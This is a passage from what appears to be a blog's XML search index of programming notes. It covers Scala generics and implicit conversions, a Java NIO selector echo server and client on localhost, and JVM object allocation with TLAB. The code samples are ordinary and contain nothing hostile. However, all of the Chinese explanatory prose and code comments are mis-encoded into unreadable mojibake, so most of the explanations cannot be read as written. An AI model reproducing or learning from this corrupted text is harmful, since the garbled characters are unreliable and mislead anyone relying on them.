å¯†å°æ ·ä¾‹ç±»âœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœ å­ç±»å’Œçˆ¶ç±»å¿…é¡»å®šä¹‰åœ¨åŒä¸€æ–‡ä»¶ä¸­ã€‚ sealed abstract class Dog&#123;&#125; case class Jing8(name:String) extends Dog&#123;&#125; case class Shapi(age:Int) extends Dog&#123;&#125; åå…­. æ³›å‹1. æ³›å‹çš„å®šä¹‰ &amp; ä¸Šä¸‹ç•Œ1234567891011121314151617181920212223242526272829// Java ä¸­å¸¸ç”¨çš„æ³›å‹ List&lt;String&gt; Map&lt;String,String&gt; // Scala ä¸­çš„æ³›å‹âœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœ//ç±»çš„æ³›å‹,å®šä¹‰æ³›å‹ç±» class Pair[T,S](one:T,second:S); //å®šä¹‰æ³›å‹ç±» val p = new Pair[String,Int]("tom",12); // åˆ›å»ºæ³›å‹å¯¹è±¡ val p = new Pair("tom",12); //ç±»å‹æ¨æ–­//æ–¹æ³•æ³›å‹ def getMiddle[T](arr:Array[T]) = arr(arr.length / 2);-&gt; å¯ä»¥ä¼ å…¥ä»»æ„ç±»å‹çš„ Arrayâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœ//æ³›å‹çš„ä¸Šç•Œ,Tå¿…é¡»æ˜¯Dogçš„å­ç±»ã€‚ def run[T &lt;: Dog](d:T) = println("hello")// å®šä¹‰ä¸‹ç•Œ,Tå¿…é¡»æ˜¯shapiçš„çˆ¶ç±»ã€‚æœ‰é—®é¢˜: æµ‹è¯•æ˜¯é€šé…çš„, ä¼ å•¥éƒ½å¯ä»¥ :TODO def run2[T &gt;: Shapi](d:T) = println("hello") &lt;: //ä¸Šç•Œï¼Œå­ç±» &gt;: //ä¸‹ç•Œï¼Œçˆ¶ç±» ??? &lt;% // A &lt;% B,Aèƒ½å¤Ÿéšå¼è½¬æ¢æˆB T &lt;:Dog &gt;:Cat //çº¦æŸå¤šä¸ªæ¡ä»¶ã€‚// è§†å›¾ç•Œå®š[T &lt;: Comparable] 2. æ³›å‹çš„å‹å˜ :TODO ä¸æ‡‚1234567Friend[+Dog] //åå˜, å¦‚æœ Aæ˜¯ Bçš„å­ç±», é‚£ä¹ˆListA ä¹Ÿæ˜¯ ListB çš„å­ç±»Friend[-Dog] //é€†å˜Friend[-Dog] // å½“é‡‡ç”¨ -å· çº¦æŸæ—¶, åŸæœ¬ Friend[NafangShapi] ä¸º Friend[Shapi] çš„å­ç±»çš„, ç°åœ¨å˜æˆçˆ¶ç±»Friend[Shapi]Friend[NafangShapi] åä¸ƒ. éšå¼è½¬æ¢ implicitéšå¼è½¬æ¢å‡½æ•°:ä½¿ç”¨ **implicit** ä¿®é¥°çš„å…·æœ‰ä¸€ä¸ªå‚æ•°çš„å‡½æ•°ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142//ï£¿ å®šä¹‰éšå¼è½¬æ¢å‡½æ•° ï£¿âœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœ // å®šä¹‰äº†ä¹‹å, è°ƒç”¨ run(100) , æ­¤100ä¼šè‡ªåŠ¨éšå¼çš„è½¬ä¸º dog å¯¹è±¡ // å½“è°ƒç”¨ä¸€ä¸ªå¯¹è±¡ä¸å­˜åœ¨æ–¹æ³•æ—¶, ä¼šå¯»æ‰¾æ˜¯å¦èƒ½éšå¼è½¬æ¢ä¸ºå…¶å®ƒå¯¹è±¡ // éœ€è¦å½“å‰ä»£ç ä¸Šä¸‹æ–‡å¯è§ implicit def int2Dog(n:Int) = Shapi(n); //å®šä¹‰ def run(d:Dog) = print("hello world"); run(100) ; //è°ƒç”¨run æ–¹æ³•, ä¼šç›´æ¥è°ƒç”¨éšå¼è½¬æ¢å‡½æ•°ã€‚ æŠŠ100ä½œä¸ºå‚æ•°, åˆ›å»º Shapi å¯¹è±¡//ï£¿ å®šä¹‰éšå¼å•ä¾‹å¯¹è±¡ ï£¿âœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœ object DogUtil&#123; //å®šä¹‰éšå¼è½¬æ¢å‡½æ•° implicit def str2Dog(s:String) = Jing8(s) ; &#125;--- ä½¿ç”¨ def run3(d:Dog) = println("hello world"); import DogUtil._ // run3("tom")//å‚æ•°é»˜è®¤å€¼--------------------------------------------- def decorate(prefix:String = "[[[",c:String,suffix:String="]]]") = ... decorate(c= "hello world")// ï£¿ éšå¼å‚æ•°(é»˜è®¤å‚æ•°) ï£¿// å‚æ•°ä¸ºéšå¼çš„å‚æ•°, å›å»æ‰¾æ­¤å‚æ•°, å¦‚æœå‚æ•°æœ‰é»˜è®¤å€¼, å°±ä¸éœ€è¦å¯¹æ­¤å‚æ•°èµ‹å€¼âœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœ object DogUtil2&#123; implicit val dog = Jing8("tomas") ; &#125; import DogUtil2._ def run4(implicit dog:Jing8) = println("hello : ") ; run4; // æ³¨æ„, å¦‚æœä¸æƒ³ä¼ å‚æ•°, æƒ³è¦è°ƒç”¨éšå¼çš„é»˜è®¤å€¼, åé¢ä¸éœ€è¦åŠ  (). æˆ–è€…é‡Œé¢ä¼  null, run4(null)]]></content>
      <categories>
        <category>Hadoop</category>
        <category>Scala</category>
      </categories>
      <tags>
        <tag>åŸåˆ›</tag>
        <tag>æŠ€æœ¯</tag>
        <tag>Hadoop</tag>
        <tag>Scala</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[æ•°æ®ç»“æ„ & ç®—æ³•]]></title>
    <url>%2F2018%2F07%2F11%2FHadoop%2F10_%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%26%E7%AE%97%E6%B3%95%2F%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%26-%E7%AE%97%E6%B3%95%2F</url>
    <content type="text"><![CDATA[å‚è€ƒ PDF æ–‡æ¡£æ•°æ®ç»“æ„å‚è€ƒPDF ç®—æ³•åŸºç¡€å‚è€ƒPDF å‚è€ƒå¤§ç‰›ç¬”è®°ç®—æ³•ç»¼è¿°åŠä»£ç å®ç° Leetcodeè§£é¢˜ å‰‘æŒ‡ Offer è§£é¢˜ å…¶å®ƒçš„è‡ªè¡ŒæŸ¥çœ‹ å‚è€ƒè‡ªå·±ä»£ç mygithub]]></content>
      <categories>
        <category>Hadoop</category>
        <category>æ•°æ®ç»“æ„&amp;ç®—æ³•</category>
      </categories>
      <tags>
        <tag>åŸåˆ›</tag>
        <tag>æŠ€æœ¯</tag>
        <tag>Hadoop</tag>
        <tag>æ•°æ®ç»“æ„</tag>
        <tag>ç®—æ³•</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[i-NIO]]></title>
    <url>%2F2018%2F07%2F11%2FHadoop%2F11_NIO%2FNIO%2F</url>
    <content type="text"><![CDATA[ä¸€. åŒæ­¥, å¼‚æ­¥ &amp; é˜»å¡, éé˜»å¡æ¦‚å¿µåŒæ­¥å’Œå¼‚æ­¥å…¶å®æŒ‡çš„æ˜¯ï¼Œè¯·æ±‚å‘èµ·æ–¹å¯¹æ¶ˆæ¯ç»“æœçš„è·å–æ˜¯ä¸»åŠ¨å‘èµ·çš„ï¼Œè¿˜æ˜¯ç­‰è¢«åŠ¨é€šçŸ¥çš„ã€‚ å¦‚æœæ˜¯è¯·æ±‚æ–¹ä¸»åŠ¨å‘èµ·çš„ï¼Œä¸€ç›´åœ¨ç­‰å¾…åº”ç­”ç»“æœï¼ˆåŒæ­¥é˜»å¡ï¼‰ å¦‚æœæ˜¯ç»“æœç”±æœåŠ¡æ–¹é€šçŸ¥çš„ï¼Œä¹Ÿå°±æ˜¯è¯·æ±‚æ–¹å‘å‡ºè¯·æ±‚åï¼Œè¦ä¹ˆåœ¨ä¸€ç›´ç­‰å¾…é€šçŸ¥ï¼ˆå¼‚æ­¥é˜»å¡ï¼‰, è¦ä¹ˆå°±å…ˆå»å¹²è‡ªå·±çš„äº‹äº†ï¼ˆå¼‚æ­¥éé˜»å¡) è°ƒç”¨äº†ä¸€ä¸ªå‡½æ•°ä¹‹åï¼Œåœ¨ç­‰å¾…è¿™ä¸ªå‡½æ•°è¿”å›ç»“æœä¹‹å‰ï¼Œå½“å‰çš„çº¿ç¨‹æ˜¯å¤„äºæŒ‚èµ·çŠ¶æ€ï¼Œè¿˜æ˜¯è¿è¡ŒçŠ¶æ€ï¼š å¦‚æœæ˜¯æŒ‚èµ·çŠ¶æ€ï¼Œå°±æ„å‘³ç€å½“å‰çº¿ç¨‹ä»€ä¹ˆéƒ½ä¸èƒ½å¹²ï¼Œå°±ç­‰ç€è·å–ç»“æœï¼Œè¿™å°±å«åŒæ­¥é˜»å¡ï¼Œ å¦‚æœä»ç„¶æ˜¯è¿è¡ŒçŠ¶æ€ï¼Œå°±æ„å‘³å½“å‰çº¿ç¨‹æ˜¯å¯ä»¥çš„ç»§ç»­å¤„ç†å…¶ä»–ä»»åŠ¡ï¼Œä½†è¦æ—¶ä¸æ—¶çš„å»çœ‹ä¸‹æ˜¯å¦æœ‰ç»“æœäº†ï¼Œè¿™å°±æ˜¯åŒæ­¥éé˜»å¡ã€‚ å½¢è±¡çš„ä¾‹å­æ•…äº‹ï¼šè€ç‹çƒ§å¼€æ°´ã€‚ å‡ºåœºäººç‰©ï¼šè€ç‹ï¼Œæ°´å£¶ä¸¤æŠŠï¼ˆæ™®é€šæ°´å£¶ï¼Œç®€ç§°æ°´å£¶ï¼›ä¼šå“çš„æ°´å£¶ï¼Œç®€ç§°å“æ°´å£¶ï¼‰ã€‚ è€ç‹æƒ³äº†æƒ³ï¼Œæœ‰å¥½å‡ ç§ç­‰å¾…æ–¹å¼1ã€è€ç‹ç”¨æ°´å£¶ç…®æ°´ï¼Œå¹¶ä¸”ç«™åœ¨é‚£é‡Œï¼Œä¸ç®¡æ°´å¼€æ²¡å¼€ï¼Œæ¯éš”ä¸€å®šæ—¶é—´çœ‹çœ‹æ°´å¼€äº†æ²¡ â€”â€”â€”-åŒæ­¥é˜»å¡è€ç‹æƒ³äº†æƒ³ï¼Œè¿™ç§æ–¹æ³•ä¸å¤Ÿèªæ˜ã€‚ 2ã€è€ç‹è¿˜æ˜¯ç”¨æ°´å£¶ç…®æ°´ï¼Œä¸å†å‚»å‚»çš„ç«™åœ¨é‚£é‡Œçœ‹æ°´å¼€ï¼Œè·‘å»å¯å®¤ä¸Šç½‘ï¼Œä½†æ˜¯è¿˜æ˜¯ä¼šæ¯éš”ä¸€æ®µæ—¶é—´è¿‡æ¥çœ‹çœ‹æ°´å¼€äº†æ²¡æœ‰ï¼Œæ°´æ²¡æœ‰å¼€å°±èµ°äººã€‚ â€”â€”â€”-åŒæ­¥éé˜»å¡è€ç‹æƒ³äº†æƒ³ï¼Œç°åœ¨çš„æ–¹æ³•èªæ˜äº†äº›ï¼Œä½†æ˜¯è¿˜æ˜¯ä¸å¤Ÿå¥½ã€‚ 3ã€è€ç‹è¿™æ¬¡ä½¿ç”¨é«˜å¤§ä¸Šçš„å“æ°´å£¶æ¥ç…®æ°´ï¼Œç«™åœ¨é‚£é‡Œï¼Œä½†æ˜¯ä¸ä¼šå†æ¯éš”ä¸€æ®µæ—¶é—´å»çœ‹æ°´å¼€ï¼Œè€Œæ˜¯ç­‰æ°´å¼€äº†ï¼Œæ°´å£¶ä¼šè‡ªåŠ¨çš„é€šçŸ¥ä»–ã€‚ â€”â€”â€”-å¼‚æ­¥é˜»å¡è€ç‹æƒ³äº†æƒ³ï¼Œä¸ä¼šå‘€ï¼Œæ—¢ç„¶æ°´å£¶å¯ä»¥é€šçŸ¥æˆ‘ï¼Œé‚£æˆ‘ä¸ºä»€ä¹ˆè¿˜è¦å‚»å‚»çš„ç«™åœ¨é‚£é‡Œç­‰å‘¢ï¼Œå—¯ï¼Œå¾—æ¢ä¸ªæ–¹æ³•ã€‚ 4ã€è€ç‹è¿˜æ˜¯ä½¿ç”¨å“æ°´å£¶ç…®æ°´ï¼Œè·‘åˆ°å®¢å…ä¸Šç½‘å»ï¼Œç­‰ç€å“æ°´å£¶è‡ªå·±æŠŠæ°´ç…®ç†Ÿäº†ä»¥åé€šçŸ¥ä»–ã€‚ â€”â€”â€”-å¼‚æ­¥éé˜»å¡ è€ç‹è±ç„¶ï¼Œè¿™ä¸‹æ„Ÿè§‰è½»æ¾äº†å¾ˆå¤šã€‚ äºŒ. NIO ä¸­ä¸€äº›é‡è¦æ¦‚å¿µJava IO æ¨¡å‹BIOâ€“åŒæ­¥é˜»å¡ï¼š JDK1.4 ä»¥å‰æˆ‘ä»¬ä½¿ç”¨çš„éƒ½æ˜¯ BIO é˜»å¡åˆ°æˆ‘ä»¬çš„è¯»å†™æ–¹æ³•ï¼Œé˜»å¡åˆ°çº¿ç¨‹æ¥æé«˜å¹¶å‘æ€§èƒ½ï¼Œä½†æ˜¯æ•ˆæœä¸æ˜¯å¾ˆå¥½ NIOâ€“åŒæ­¥éé˜»å¡ï¼š(New IO) JDK1.4 Linux å¤šè·¯å¤ç”¨æŠ€æœ¯ï¼ˆselect æ¨¡å¼ï¼‰å®ç° IO äº‹ä»¶çš„è½®è¯¢æ–¹å¼ï¼šåŒæ­¥ éé˜»å¡çš„æ¨¡å¼ï¼Œè¿™ç§æ–¹å¼ç›®å‰æ˜¯ä¸»æµçš„ç½‘ç»œé€šä¿¡æ¨¡å¼ Mina å’Œ Netty â€“ ç½‘ç»œé€šä¿¡æ¡†æ¶ï¼Œæ¯”è‡ªå·±å†™ NIO è¦å®¹æ˜“äº›ï¼Œå¹¶ä¸”ä»£ç å¯è¯»æ€§æ›´å¥½ AIOâ€“å¼‚æ­¥éé˜»å¡ IOï¼š JDK1.7ï¼ˆNIO2ï¼‰çœŸæ­£çš„å¼‚æ­¥éé˜»å¡ IO(åŸºäº linux çš„ epoll æ¨¡å¼ï¼‰AIO ç›® å‰ä½¿ç”¨çš„è¿˜æ¯”è¾ƒå°‘ é€šé“ channel &amp; ç¼“å†²åŒº buffer1. é€šé“ channelå…³é”®è¯: æ¨¡æ‹Ÿæµ, æ‰“å¼€çš„è¿æ¥, åŒå‘å¯è¯»å†™, çº¿ç¨‹å®‰å…¨, åªèƒ½é€šè¿‡ç¼“å†²åŒºæ“ä½œ ç±»å‹ FileChannelï¼šä»æ–‡ä»¶ä¸­è¯»å†™æ•°æ®ï¼› DatagramChannelï¼šé€šè¿‡ UDP è¯»å†™ç½‘ç»œä¸­æ•°æ®ï¼› SocketChannelï¼šé€šè¿‡ TCP è¯»å†™ç½‘ç»œä¸­æ•°æ®ï¼› ServerSocketChannelï¼šå¯ä»¥ç›‘å¬æ–°è¿›æ¥çš„ TCP è¿æ¥ï¼Œå¯¹æ¯ä¸€ä¸ªæ–°è¿›æ¥çš„è¿æ¥éƒ½ä¼šåˆ›å»ºä¸€ä¸ª SocketChannelã€‚ 2. ç¼“å†²åŒº bufferä¸èƒ½ç›´æ¥å¯¹é€šé“è¿›è¡Œè¯»å†™æ•°æ®ï¼Œè€Œæ˜¯è¦å…ˆç»è¿‡ç¼“å†²åŒºã€‚ ç¼“å†²åŒºå®è´¨ä¸Šæ˜¯ä¸€ä¸ªæ•°ç»„, æä¾›äº†å¯¹æ•°æ®çš„ç»“æ„åŒ–è®¿é—®ã€‚ ç±»å‹: ByteBuffer CharBuffer ShortBuffer IntBuffer LongBuffer FloatBuffer DoubleBuffer å…³é”®è¯: capacityï¼šæœ€å¤§å®¹é‡ï¼› positionï¼šå½“å‰å·²ç»è¯»å†™çš„å­—èŠ‚æ•°ï¼› limitï¼šè¿˜å¯ä»¥è¯»å†™çš„å­—èŠ‚æ•°ã€‚ å…¶å®ƒè¯¦æƒ…å¯è§ Java IO ä¸‰. ä»£ç å®ä¾‹Server123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107package com.rox.nio;import java.io.IOException;import java.net.InetSocketAddress;import java.net.Socket;import java.nio.ByteBuffer;import java.nio.channels.*;import java.util.Iterator;/** * æ³¨æ„: selectoræŒ‘é€‰å™¨, ç»´æŠ¤è‹¥å¹²é›†åˆ * selectionKeys : æ³¨å†Œçš„key * selectedKeys : æŒ‘é€‰å‡ºæ¥çš„key -- æœ‰äº‹ä»¶çš„ key * å®¢æˆ·ç«¯ &amp; æœåŠ¡ç«¯å¯¹åº”çš„å®¢æˆ·ç«¯ SocketChannel(å¥—æ¥å­—é€šé“), ä¸€èˆ¬æ¥è®², åªéœ€è¦å¯¹ read æ„Ÿå…´è¶£ * ä¹Ÿå°±æ˜¯æ‹¦æˆª read æ¶ˆæ¯, write çš„è¯éšæ—¶éƒ½å¯ä»¥ write * sc æ˜¯å¯è¯»å¯å†™çš„ */public class MyServer &#123; public static void main(String[] args) throws Exception &#123; // åˆ†é…ç¼“å†²åŒºbufå†…å­˜ ByteBuffer buf = ByteBuffer.allocate(1024); // å¼€å¯æŒ‘é€‰å™¨ Selector sel = Selector.open(); // å¼€å¯ ServerSocket é€šé“ ServerSocketChannel ssc = ServerSocketChannel.open(); // ç»‘å®šç«¯å£ ssc.socket().bind(new InetSocketAddress("localhost", 8888)); // è®¾ç½®éé˜»å¡ ssc.configureBlocking(false); // åœ¨æŒ‘é€‰å™¨ä¸­æ³¨å†Œé€šé“(æœåŠ¡å™¨é€šé“, å’Œæ„Ÿå…´è¶£çš„äº‹ä»¶ - OP_ACCEPT) ssc.register(sel, SelectionKey.OP_ACCEPT); // åˆå§‹åŒ–å¯é€‰æ‹©é€šé“å¯¹è±¡(ä¸º ServerSocketChannel &amp; SocketChannel çš„å…±åŒçˆ¶ç±») SelectableChannel sc = null; while (true) &#123; // æŒ‘é€‰å™¨å¼€å§‹é€‰æ‹©(é˜»å¡çš„) // å¦‚æœä¹ˆæœ‰æ¥æ”¶åˆ° æ„Ÿå…´è¶£äº‹ä»¶, å°±å¡åœ¨è¿™é‡Œ sel.select(); // èƒ½èµ°åˆ°è¿™ä¸€æ­¥, å°±æ˜¯å·²ç»æ¥æ”¶åˆ°äº† accept äº‹ä»¶ // è¿­ä»£æŒ‘é€‰å‡ºæ¥çš„ key çš„é›†åˆ Iterator&lt;SelectionKey&gt; it = sel.selectedKeys().iterator(); while (it.hasNext()) &#123; SelectionKey key = it.next(); try &#123; // å¦‚æœæ³¨å†Œçš„ keyæ˜¯å¯æ¥å—çš„, å°±ä¸€å®šæ˜¯æœåŠ¡å™¨é€šé“ if (key.isAcceptable()) &#123; // å–å‡ºè¯¥é€šé“, è¿”å›ä¸€ä¸ª SelectableChannel çš„è¶…ç±»å¯¹è±¡ sc = key.channel(); // å› ä¸ºæ‹¿åˆ°çš„ key æ˜¯ isAcceptable, æ‰€ä»¥å¯ä»¥åˆ¤æ–­æ˜¯ ssc å¯¹è±¡, å¼ºè½¬ // å¹¶é€šè¿‡ accept()æ–¹æ³•, è¿”å›ä¸€ä¸ª sc å¯¹è±¡(ç±»ä¼¼äºå¥—æ¥å­—, ä¸å®¢æˆ·ç«¯çš„ sc å¯¹åº”, è´Ÿè´£è·Ÿå®¢æˆ·ç«¯çš„ sc é€šä¿¡) SocketChannel sc0 = ((ServerSocketChannel) sc).accept(); // è®¾ç½® sc0 ä¸ºéé˜»å¡ sc0.configureBlocking(false); // ä¸ºæ¥æ”¶åˆ°çš„è¿™ä¸ª sc åœ¨é€‰æ‹©å™¨ä¸­, æ³¨å†Œè¯»äº‹ä»¶ sc0.register(sel, SelectionKey.OP_READ); &#125; // ä¸‹ä¸€æ¬¡è½®è¯¢, å‘ç°æ˜¯æ¥è‡ª è¯»äº‹ä»¶ çš„key if (key.isReadable()) &#123; // å–å‡º channel, ç›´æ¥å¼ºè½¬ä¸º SocketChannel SocketChannel sc1 = (SocketChannel) key.channel(); /// å›å¤å®¢æˆ·ç«¯æ¶ˆæ¯, å‰é¢åŠ ä¸ªå¤´'hello', ç„¶åå†å†™å›å» // åˆ›å»ºæ¶ˆæ¯å­—èŠ‚æ•°ç»„ byte[] helloBytes = "hello: ".getBytes(); // æŠŠå­—èŠ‚æ•°ç»„æ”¾å…¥ buf buf.put(helloBytes, 0, helloBytes.length); // è¯»å–æ¶ˆæ¯ // ä¸å­˜åœ¨è¯»å®Œ, åªè¦ä¸ä¸º0, å°±ä¸€ç›´è½®è¯¢è¯» // ä»é€šé“é‡Œè¯»å‡ºæ¥,æ”¾åˆ°ç¼“å†²åŒºé‡Œ while (sc1.read(buf) &gt; 0) &#123; // æ‹æ¿, å®šç¨¿, &gt; 0è¯´æ˜æœ‰æ•°æ® // position å½’0, limit ç½®åœ¨ å·²å†™å…ƒç´  çš„åé¢ä¸€æ ¼, æ­¤æ—¶ä¸æ¥å—å…¶å®ƒå†™å…¥äº† buf.flip(); // æŒæœ‰çš„ sc å¯¹è±¡å†™å…¥åˆ°channel sc1.write(buf); // å†™å®Œå æ¸…ç©º, position å½’0, limit æœ€å¤§ buf.clear(); &#125; &#125; &#125; catch (Exception e) &#123; // å¦‚æœå¤±è´¥, ç§»é™¤æœ¬æ¬¡æ¥æ”¶åˆ°çš„ keys sel.keys().remove(key); &#125; &#125; // æœ¬æ¬¡é€‰æ‹©å™¨äº‹ä»¶å¤„ç†å®Œäº†ä¹‹å // ç§»é™¤æ‰€æœ‰é€‰æ‹©å‡ºæ¥çš„ key sel.selectedKeys().clear(); &#125; &#125;&#125; Client123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687package com.rox.nio;import java.io.ByteArrayOutputStream;import java.io.IOException;import java.net.InetSocketAddress;import java.net.Socket;import java.net.SocketAddress;import java.nio.ByteBuffer;import java.nio.channels.SelectionKey;import java.nio.channels.Selector;import java.nio.channels.SocketChannel;public class MyClient &#123; public static void main(String[] args) throws Exception &#123; // buf ByteBuffer buf = ByteBuffer.allocate(1024 * 8); // å¼€ä¸€ä¸ª selector Selector sel = Selector.open(); // å¼€ä¸€ä¸ªå¥—æ¥å­—é€šé“ SocketChannel sc = SocketChannel.open(); // ä¸‹é¢2ç§è¿æ¥æ²¡åŒºåˆ« sc.socket().connect(new InetSocketAddress("localhost", 8888));// sc.connect(new InetSocketAddress("localhost", 8888)); // é…ç½®æ˜¯å¦é˜»å¡ sc.configureBlocking(false); // æ³¨å†Œ sel å¯¹è±¡åŠ å…³æ³¨çš„ key sc.register(sel, SelectionKey.OP_READ); // å¾€ buf ä¸­ put è¿›æ•°æ®(ä¸€æ¬¡)// buf.put("tom".getBytes());// buf.flip();// sc.write(buf);// buf.clear(); // å¦‚æœæƒ³è¦æŒç»­ä¸æ–­çš„é€šä¿¡, å¯ä»¥å¼€ä¸ªåˆ†çº¿ç¨‹ (æŒç»­æ”¶å‘æ¶ˆæ¯) // ç¨‹åºæ˜¯ä»ä¸Šå¾€ä¸‹è¿è¡Œçš„, è¿è¡Œåˆ°ä¸‹é¢æ²¡æœ‰æ¥å—åˆ°æ¶ˆæ¯çš„è¯ä¼šå¡ä½ // ä¸€æ—¦å¡ä½äº†, ä¹Ÿå°±æ— æ³•ç»§ç»­åŒæœåŠ¡ç«¯é€šä¿¡äº† new Thread()&#123; public void run() &#123; int i = 0 ; // è¿™é‡Œåˆ›å»ºä¸€ä¸ªæ–°çš„ç¼“å†²åŒºä¸“ç”¨ ByteBuffer buf2 = ByteBuffer.allocate(1024 * 8); while(true)&#123; try &#123; buf2.put(("Tom" + (i ++)).getBytes()); buf2.flip(); //åˆ‡æ¢è¯»å†™ sc.write(buf2); buf2.clear(); Thread.sleep(500); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125; &#125; &#125;.start(); while (true) &#123; // é€‰æ‹©å™¨é€‰æ‹©, æ¥å— æœåŠ¡ç«¯è¿”å›çš„ key sel.select(); ByteArrayOutputStream baos = new ByteArrayOutputStream(); // ä»é€šé“è¯»å–åˆ°ç¼“å†²åŒº while (sc.read(buf) &gt; 0) &#123; // è¯»åˆ°äº†æ•°æ®, å°±æ‹ä¸€ä¸‹æ¿ buf.flip(); // ä»ç¼“å†²åŒº buf å†™å…¥åˆ° ByteArrayOutputStream æµ baos.write(buf.array(), 0, buf.limit()); // å†™å®Œäº†å°±æ¸…ç©º ç¼“å†²åŒºbuf buf.clear(); &#125; // æ‰“å°æ¥å—åˆ°çš„æ•°æ® System.out.println(new String(baos.toByteArray())); baos.close(); // æ¸…ç©º selectedKeysçš„ set sel.selectedKeys().clear(); &#125; &#125;&#125; å…¶å®ƒçš„ä»£ç å‚è€ƒæˆ‘çš„ Githubmygithub]]></content>
      <categories>
        <category>Hadoop</category>
        <category>NIO</category>
      </categories>
      <tags>
        <tag>åŸåˆ›</tag>
        <tag>æŠ€æœ¯</tag>
        <tag>Hadoop</tag>
        <tag>NIO</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[newObject]]></title>
    <url>%2F2018%2F07%2F09%2FJava%2FInterview%2FJava-Interview%2FnewObject%2F</url>
    <content type="text"><![CDATA[å¯¹è±¡çš„åˆ›å»ºä¸å†…å­˜åˆ†é…åˆ›å»ºå¯¹è±¡å½“ JVM æ”¶åˆ°ä¸€ä¸ª new æŒ‡ä»¤æ—¶ï¼Œä¼šæ£€æŸ¥æŒ‡ä»¤ä¸­çš„å‚æ•°åœ¨å¸¸é‡æ± æ˜¯å¦æœ‰è¿™ä¸ªç¬¦å·çš„å¼•ç”¨ï¼Œè¿˜ä¼šæ£€æŸ¥è¯¥ç±»æ˜¯å¦å·²ç»è¢«åŠ è½½è¿‡äº†ï¼Œå¦‚æœæ²¡æœ‰çš„è¯åˆ™è¦è¿›è¡Œä¸€æ¬¡ç±»åŠ è½½ã€‚ æ¥ç€å°±æ˜¯åˆ†é…å†…å­˜äº†ï¼Œé€šå¸¸æœ‰ä¸¤ç§æ–¹å¼ï¼š æŒ‡é’ˆç¢°æ’ ç©ºé—²åˆ—è¡¨ ä½¿ç”¨æŒ‡é’ˆç¢°æ’çš„å‰ææ˜¯å †å†…å­˜æ˜¯å®Œå…¨å·¥æ•´çš„ï¼Œç”¨è¿‡çš„å†…å­˜å’Œæ²¡ç”¨çš„å†…å­˜å„åœ¨ä¸€è¾¹æ¯æ¬¡åˆ†é…çš„æ—¶å€™åªéœ€è¦å°†æŒ‡é’ˆå‘ç©ºé—²å†…å­˜ä¸€æ–¹ç§»åŠ¨ä¸€æ®µå’Œå†…å­˜å¤§å°ç›¸ç­‰åŒºåŸŸå³å¯ã€‚ å½“å †ä¸­å·²ç»ä½¿ç”¨çš„å†…å­˜å’Œæœªä½¿ç”¨çš„å†…å­˜äº’ç›¸äº¤é”™æ—¶ï¼ŒæŒ‡é’ˆç¢°æ’çš„æ–¹å¼å°±è¡Œä¸é€šäº†ï¼Œè¿™æ—¶å°±éœ€è¦é‡‡ç”¨ç©ºé—²åˆ—è¡¨çš„æ–¹å¼ã€‚è™šæ‹Ÿæœºä¼šç»´æŠ¤ä¸€ä¸ªç©ºé—²çš„åˆ—è¡¨ï¼Œç”¨äºè®°å½•å“ªäº›å†…å­˜æ˜¯å¯ä»¥è¿›è¡Œåˆ†é…çš„ï¼Œåˆ†é…æ—¶ç›´æ¥ä»å¯ç”¨å†…å­˜ä¸­ç›´æ¥åˆ†é…å³å¯ã€‚ å †ä¸­çš„å†…å­˜æ˜¯å¦å·¥æ•´æ˜¯æœ‰åƒåœ¾æ”¶é›†å™¨æ¥å†³å®šçš„ï¼Œå¦‚æœå¸¦æœ‰å‹ç¼©åŠŸèƒ½çš„åƒåœ¾æ”¶é›†å™¨å°±æ˜¯é‡‡ç”¨æŒ‡é’ˆç¢°æ’çš„æ–¹å¼æ¥è¿›è¡Œå†…å­˜åˆ†é…çš„ã€‚ åˆ†é…å†…å­˜æ—¶ä¹Ÿä¼šå‡ºç°å¹¶å‘é—®é¢˜: è¿™æ ·å¯ä»¥åœ¨åˆ›å»ºå¯¹è±¡çš„æ—¶å€™ä½¿ç”¨ CAS è¿™æ ·çš„ä¹è§‚é”æ¥ä¿è¯ã€‚ ä¹Ÿå¯ä»¥å°†å†…å­˜åˆ†é…å®‰æ’åœ¨æ¯ä¸ªçº¿ç¨‹ç‹¬æœ‰çš„ç©ºé—´è¿›è¡Œï¼Œæ¯ä¸ªçº¿ç¨‹é¦–å…ˆåœ¨å †å†…å­˜ä¸­åˆ†é…ä¸€å°å—å†…å­˜ï¼Œç§°ä¸ºæœ¬åœ°åˆ†é…ç¼“å­˜(TLAB : Thread Local Allocation Buffer)ã€‚ åˆ†é…å†…å­˜æ—¶ï¼Œåªéœ€è¦åœ¨è‡ªå·±çš„åˆ†é…ç¼“å­˜ä¸­åˆ†é…å³å¯ï¼Œç”±äºè¿™ä¸ªå†…å­˜åŒºåŸŸæ˜¯çº¿ç¨‹ç§æœ‰çš„ï¼Œæ‰€ä»¥ä¸ä¼šå‡ºç°å¹¶å‘é—®é¢˜ã€‚ å¯ä»¥ä½¿ç”¨ -XX:+/-UseTLAB å‚æ•°æ¥è®¾å®š JVM æ˜¯å¦å¼€å¯ TLAB ã€‚ 